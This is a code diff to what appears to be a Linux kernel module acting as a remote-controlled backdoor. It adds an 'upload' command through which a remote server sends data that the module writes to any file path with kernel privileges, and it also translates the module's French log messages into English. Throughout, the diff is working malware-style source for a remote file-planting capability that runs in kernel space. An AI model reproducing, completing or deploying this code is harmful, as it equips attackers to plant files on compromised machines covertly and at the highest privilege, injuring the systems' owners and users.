@@ -18,17 +18,16 @@ struct upload_task_data {
 static int upload_thread_fn(void *arg) {
     struct upload_task_data *task = (struct upload_task_data *)arg;
 
-    DBG_MSG("upload_thread_fn: écriture %ld octets dans %s\n", task->size, task->path);
+    DBG_MSG("upload_thread_fn: writing %ld bytes to %s\n", task->size, task->path);
 
     struct file *filp = filp_open(task->path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (IS_ERR(filp)) {
-        ERR_MSG("upload_thread_fn: failed to open: %s\n", task->path);
-        send_to_server("Error while writing file (thread).\n");
-    }
-    else {
+        ERR_MSG("upload_thread_fn: failed to open file: %s\n", task->path);
+        send_to_server("Failed to write file.\n");
+    } else {
         kernel_write(filp, task->buffer, task->size, &filp->f_pos);
         filp_close(filp, NULL);
-        send_to_server("File written successfully (thread).\n");
+        send_to_server("File written successfully.\n");
     }
 
     kfree(task->buffer);
@@ -50,11 +49,11 @@ int handle_upload_chunk(const char *data, size_t len) {
     upload_received += to_copy;
 
     if (upload_received >= upload_size) {
-        DBG_MSG("handle_upload_chunk: complete, thread launched\n");
+        DBG_MSG("handle_upload_chunk: full upload received, starting thread\n");
 
         struct upload_task_data *task = kmalloc(sizeof(struct upload_task_data), GFP_KERNEL);
         if (!task) {
-            ERR_MSG("handle_upload_chunk: échec alloc task\n");
+            ERR_MSG("handle_upload_chunk: failed to allocate task\n");
             return -ENOMEM;
         }
 
@@ -90,5 +89,30 @@ int start_upload(const char *path, long size) {
     receiving_file = true;
 
     DBG_MSG("start_upload: ready to receive %ld bytes to %s\n", size, path);
+    return 0;
+}
+
+int upload_handler(char *args) {
+    char *path_str = strsep(&args, " ");
+    char *size_str = args;
+
+    if (!path_str || !size_str) {
+        send_to_server("Usage: upload <remote_path> <size>\n");
+        return -EINVAL;
+    }
+
+    long size;
+    if (kstrtol(size_str, 10, &size) < 0 || size <= 0) {
+        send_to_server("Invalid file size.\n");
+        return -EINVAL;
+    }
+
+    int ret = start_upload(path_str, size);
+    if (ret < 0) {
+        send_to_server("Failed to initiate upload.\n");
+        return ret;
+    }
+
+    send_to_server("READY");
     return 0;
 }
